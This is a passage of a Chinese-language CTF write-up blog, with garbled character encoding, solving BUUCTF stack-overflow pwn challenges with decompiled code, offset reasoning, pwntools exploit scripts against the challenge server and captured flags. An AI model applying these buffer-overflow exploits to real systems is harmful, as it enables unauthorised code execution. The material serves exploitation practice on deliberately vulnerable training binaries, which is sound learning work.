</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>num</span><span class=si>}</span><span class=s2> è½¬æ¢ç»“æœï¼š</span><span class=si>{</span><span class=n>num2byte</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>44</span> <span class=o>+</span> <span class=n>num2byte</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Let&#39;s guess the number.&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‹¿åˆ°flagï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>b&#34;Let&#39;s guess the number.&#34;
</span></span><span class=line><span class=cl>[*] Switching to interactive mode
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flag{3214184b-a04b-419e-b114-52e08022514e}
</span></span><span class=line><span class=cl>[*] Got EOF while reading in interactive
</span></span></code></pre></td></tr></table></div></div><p>ä¸»åŒ…ä¸»åŒ…ï¼Œfloatè½¬byteè¿˜æ˜¯å¤ªéº»çƒ¦ï¼Œæœ‰æ²¡æœ‰æ›´<strong>ç®€å•ç²—æš´</strong>ä¸€ç‚¹çš„æ–¹æ³•ï¼Ÿæœ‰çš„å…„å¼Ÿï¼Œæœ‰çš„ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl>  <span class=n>gets</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=o>==</span> <span class=mf>11.28125</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>system</span><span class=p>(</span><span class=s>&#34;cat /flag&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>æ—¢ç„¶ä½ æºç é‡Œæœ‰<code>system("cat /flag")</code>ï¼Œé‚£æˆ‘ä»¬å¯ä¸å¯ä»¥ç›´æ¥è¦†ç›–åˆ°è¿™ä¸ªshellcodeçš„åœ°å€ï¼Œç›´æ¥æ‰§è¡Œshellcodeï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼</p><p>å…ˆæ¥æŸ¥æŸ¥shellcodeåœ°å€ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004006</span><span class=nf>BE</span>                 <span class=no>mov</span>     <span class=no>edi</span><span class=p>,</span> <span class=no>offset</span> <span class=no>command</span> <span class=c1>; &#34;cat /flag&#34;
</span></span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°åœ°å€ï¼š<code>0x4006BE</code>ï¼›</p><p>å·²çŸ¥v1é•¿44ï¼Œv2é•¿4ï¼Œæ—§rbpé•¿8ï¼Œé‚£æˆ‘é—®ä½ ï¼Œéœ€è¦é¡¶æ‰å¤šå°‘byteï¼Ÿæ²¡é”™ï¼Œä¹Ÿå°±æ˜¯44+4+8=56ï¼</p><p>å†æ¥æ„å»ºpayload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>56</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4006BE</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>EZï¼Œæ‹¿åˆ°äº†ï¼</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>b&#34;Let&#39;s guess the number.&#34;
</span></span><span class=line><span class=cl>[*] Switching to interactive mode
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Its value should be 11.28125
</span></span><span class=line><span class=cl>flag{47e47e55-73c9-4c29-98cc-8e3e879669ec}
</span></span><span class=line><span class=cl>timeout: the monitored command dumped core
</span></span><span class=line><span class=cl>[*] Got EOF while reading in interactive
</span></span></code></pre></td></tr></table></div></div><p>å®Œæ•´è„šæœ¬ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>26748</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>56</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4006BE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Let&#39;s guess the number.&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pwn1_sctf_2016-fgets>pwn1_sctf_2016 (fgets())</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] &#39;/home/wuko233/Projects/pwn/pwn1_sctf_2016/pwn1_sctf_2016&#39;
</span></span><span class=line><span class=cl>    Arch:       i386-32-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      No canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE (0x8048000)
</span></span><span class=line><span class=cl>    Stripped:   No
</span></span></code></pre></td></tr></table></div></div><p>32ä½</p><p><code>main</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>vuln</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>vuln</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=nf>vuln</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>v0</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span> <span class=c1>// [esp+1Ch] [ebp-3Ch] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v3</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span> <span class=c1>// [esp+3Ch] [ebp-1Ch] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v4</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span> <span class=c1>// [esp+40h] [ebp-18h] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [esp+47h] [ebp-11h] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v6</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span> <span class=c1>// [esp+48h] [ebp-10h] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v7</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span> <span class=c1>// [esp+4Fh] [ebp-9h] BYREF
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Tell me something about yourself: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fgets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=n>edata</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=k>operator</span><span class=o>=</span><span class=p>(</span><span class=o>&amp;</span><span class=n>input</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::</span><span class=n>allocator</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>string</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span> <span class=s>&#34;you&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::</span><span class=n>allocator</span><span class=p>(</span><span class=n>v7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>string</span><span class=p>(</span><span class=n>v6</span><span class=p>,</span> <span class=s>&#34;I&#34;</span><span class=p>,</span> <span class=n>v7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>replace</span><span class=p>((</span><span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=o>*</span><span class=p>)</span><span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=k>operator</span><span class=o>=</span><span class=p>(</span><span class=o>&amp;</span><span class=n>input</span><span class=p>,</span> <span class=n>v3</span><span class=p>,</span> <span class=n>v6</span><span class=p>,</span> <span class=n>v4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>v6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::~</span><span class=n>allocator</span><span class=p>(</span><span class=n>v7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>v4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::~</span><span class=n>allocator</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v0</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>c_str</span><span class=p>((</span><span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>strcpy</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>v0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>printf</span><span class=p>(</span><span class=s>&#34;So, %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>(cppåç¼–è¯‘çœŸéš¾çœ‹ã€‚ã€‚)</p><p>æ³¨æ„åˆ°å…¶ä¸­å®šä¹‰v4ã€v6åˆ†åˆ«ä¸º<code>you</code>ã€<code>I</code>ï¼ŒåŒæ—¶åœ¨<code>replace</code>å‡½æ•°ä¸­è¢«è°ƒç”¨ï¼ˆv3ï¼‰ï¼Œæ‰€ä»¥çŒœæµ‹åº”è¯¥æ˜¯æ›¿æ¢<code>input</code>å†…å®¹ä¸­çš„<code>I</code>ä¸º<code>you</code>ã€‚</p><p><code>fgets()</code>å†…å®¹ç¼“å†²åŒºé•¿åº¦ä¸º32ï¼›<code>s</code>ä½äº3Cï¼ˆesp+1Ch ebp-3Chï¼‰ï¼Œä¹Ÿå°±æ˜¯3*16+12=60å­—èŠ‚é•¿åº¦ï¼›32ä½ç¨‹åºï¼ˆArch:i386-32-littleï¼‰ï¼Œæ‰€ä»¥è¿”å›åœ°å€é•¿åº¦æ˜¯4ï¼›</p><p>éœ€è¦é€šè¿‡æº¢å‡ºfgets()æ¥è¦†ç›–så’Œè¿”å›åœ°å€ï¼Œä½†æ˜¯fgets()ç¼“å†²åŒºåªæœ‰32ï¼Œæˆ‘ä»¬å´éœ€è¦60+4=64ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>è¿™æ—¶å°±å¯ä»¥åˆ©ç”¨<code>replace()</code>äº†ï¼ä¸€ä¸ª<code>I</code>1é•¿åº¦æ¢3é•¿åº¦çš„<code>you</code>ï¼Œæˆ‘ä»¬æœ€å¤šå°±å¯ä»¥å¾—åˆ°32*3=109çš„é•¿åº¦äº†ï¼ä½†æˆ‘ä»¬åªéœ€è¦64é•¿åº¦ï¼Œ64/3=21ä½™1:ã€‚</p><p>æ‰€ä»¥å…ˆæ„å»ºpayloadçš„ä¸€éƒ¨åˆ†ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;I&#39;</span> <span class=o>*</span> <span class=mi>21</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™æ ·å°±å®ç°äº†è¦†ç›–sä¸è¿”å›åœ°å€äº†ï¼Œæ¥ä¸‹æ¥å°±å·®shellcodeäº†ï¼š</p><p><code>get_flag</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=nf>get_flag</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>system</span><span class=p>(</span><span class=s>&#34;cat flag.txt&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span> <span class=c1>; int get_flag()
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span>                 <span class=no>public</span> <span class=no>get_flag</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span> <span class=no>get_flag</span>        <span class=no>proc</span> <span class=no>near</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span> <span class=c1>; __unwind {
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span>                 <span class=no>push</span>    <span class=no>ebp</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0E</span>                 <span class=no>mov</span>     <span class=no>ebp</span><span class=p>,</span> <span class=no>esp</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F10</span>                 <span class=no>sub</span>     <span class=no>esp</span><span class=p>,</span> <span class=mi>18</span><span class=no>h</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F13</span>                 <span class=no>mov</span>     <span class=no>dword</span> <span class=no>ptr</span> <span class=p>[</span><span class=no>esp</span><span class=p>],</span> <span class=no>offset</span> <span class=no>command</span> <span class=c1>; &#34;cat flag.txt&#34;
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F1A</span>                 <span class=no>call</span>    <span class=no>_system</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F1F</span>                 <span class=no>leave</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F20</span>                 <span class=no>retn</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F20</span> <span class=c1>; } // starts at 8048F0D
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F20</span> <span class=no>get_flag</span>        <span class=no>endp</span>
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„åˆ°shellcodeåœ°å€ä¸º<code>8048F13</code>ï¼Œæ‰€ä»¥æ„å»ºååŠéƒ¨åˆ†shellcode:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x8048F13</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°æœ€ç»ˆè„šæœ¬ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>29992</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;I&#39;</span> <span class=o>*</span> <span class=mi>21</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x8048F13</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‹¿ä¸‹ï¼</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PS D:<span class=se>\B</span>23<span class=se>\V</span>SC<span class=se>\H</span>5<span class=se>\k</span>oishi.521514.xyz&gt; <span class=p>&amp;</span> <span class=s2>&#34;D:/Program Files/python/python.exe&#34;</span> d:/CTF/é¡¹ç›®/BUU/pwn/pwn1_sctf_2016/hack.py
</span></span><span class=line><span class=cl><span class=o>[</span>x<span class=o>]</span> Opening connection to node5.buuoj.cn on port <span class=m>29992</span>
</span></span><span class=line><span class=cl><span class=o>[</span>x<span class=o>]</span> Opening connection to node5.buuoj.cn on port 29992: Trying 117.21.200.176
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Opening connection to node5.buuoj.cn on port 29992: Done
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
</span></span><span class=line><span class=cl>flag<span class=o>{</span>87ce8c15-cb0e-4149-8980-f5ca1a9e1573<span class=o>}</span>
</span></span><span class=line><span class=cl>timeout: the monitored <span class=nb>command</span> dumped core
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</span></span></code></pre></td></tr></table></div></div><h2 id=jarvisoj_level0-read>jarvisoj_level0 (read())</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] &#39;/home/wuko233/Projects/pwn/jarvisoj_level0/level0&#39;
</span></span><span class=line><span class=cl>    Arch:       amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:      No RELRO
</span></span><span class=line><span class=cl>    Stack:      No canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE (0x400000)
</span></span><span class=line><span class=cl>    Stripped:   No
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Hello, World</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mh>0xDuLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>vulnerable_function</span><span class=p>(</span><span class=mi>1LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>size_t</span> <span class=nf>vulnerable_function</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>128</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-80h] BYREF
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x200uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„åˆ°<code>read()</code>å‡½æ•°ï¼Œå¯ä»¥æº¢å‡ºï¼Œ<code>buf</code>ç¼“å†²åŒºå¤§å°ä¸º128ï¼Œ64ä½ç¨‹åºï¼Œæ‰€ä»¥è¿”å›åœ°å€é•¿åº¦8ã€‚</p><p>æ„å»ºå‰åŠéƒ¨åˆ†payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
